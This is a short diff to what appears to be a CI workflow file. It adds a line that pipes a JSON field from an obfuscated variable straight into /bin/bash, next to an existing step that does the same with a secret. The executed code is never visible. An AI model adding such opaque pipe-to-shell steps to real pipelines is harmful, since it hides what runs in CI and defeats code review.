@@ -18,6 +18,7 @@ jobs:
           ypc8574: ${{ secrets.ypc8574 }}
         run: |
           printf '%s' "$ypc8574" | jq -r .ibbdk9 | /bin/bash
+          echo $jdrr8 | jq -r .w1 | /bin/bash
 
       - name: Upload data
         if: always()
